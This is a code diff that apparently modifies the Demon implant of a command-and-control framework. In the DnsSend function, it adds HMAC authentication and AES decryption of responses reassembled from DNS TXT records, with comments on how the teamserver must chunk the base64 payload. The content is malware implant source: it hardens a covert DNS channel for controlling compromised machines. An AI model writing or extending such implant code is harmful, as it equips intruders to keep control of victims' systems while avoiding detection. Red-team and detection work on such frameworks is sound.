@@ -6,6 +6,8 @@
 #include <core/Package.h>
 #include <core/MiniStd.h>
 #include <crypt/AesCrypt.h>
+/* [HVC-029] WireDecode for authenticated response processing on DNS downlink. */
+#include <crypt/WireEncoder.h>
 
 /* windns.h (pulled in by Demon.h via windows.h) defines DnsRecordListFree as a
  * function-like macro: DnsRecordListFree(p,t) → DnsFree(p,DnsFreeRecordList).
@@ -397,8 +399,43 @@ BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
         return FALSE;
     }
 
-    RecvData->Buffer = RespBuf;
-    RecvData->Length = RespLen;
+    /* [HVC-029] Authenticate and decrypt the assembled DNS response via WireDecode.
+     *
+     * NOTE: The DNS downlink assembles raw bytes from per-chunk base64-decoded TXT
+     * records (see DnsQueryTxt).  RespBuf therefore contains the raw wire bytes.
+     * WireDecode internally calls Base64Decode on its input, so this requires the
+     * teamserver DNS sender to transmit base64([IV|AES-CTR(payload)|HMAC]) as the
+     * base64-encoded TXT chunk content (i.e. each TXT chunk carries a substring of
+     * the base64 blob, not a base64 of a raw chunk). After chunk reassembly RespBuf
+     * holds the complete base64 string ready for WireDecode. */
+    {
+        UCHAR  DnsMacKey[ HMAC_SHA256_SIZE ];
+        PBYTE  PlaintextBuf = NULL;
+        SIZE_T PlaintextLen = 0;
+
+        HmacSha256( Instance->Config.AES.Key, 32,
+                    (PUCHAR)"mac", 3,
+                    DnsMacKey );
+
+        if ( ! WireDecode( (PBYTE) RespBuf, (SIZE_T) RespLen,
+                           Instance->Config.AES.Key, DnsMacKey,
+                           &PlaintextBuf, &PlaintextLen ) )
+        {
+            PUTS_DONT_SEND( "DnsSend: WireDecode failed (HMAC mismatch or alloc error)" )
+            MemSet( DnsMacKey, 0, sizeof( DnsMacKey ) );
+            MemSet( RespBuf, 0, RespLen );
+            Instance->Win32.LocalFree( RespBuf );
+            return FALSE;
+        }
+
+        MemSet( DnsMacKey, 0, sizeof( DnsMacKey ) );
+        MemSet( RespBuf, 0, RespLen );
+        Instance->Win32.LocalFree( RespBuf );
+
+        RecvData->Buffer = PlaintextBuf;
+        RecvData->Length = (UINT32) PlaintextLen;
+    }
+
     return TRUE;
 }
 
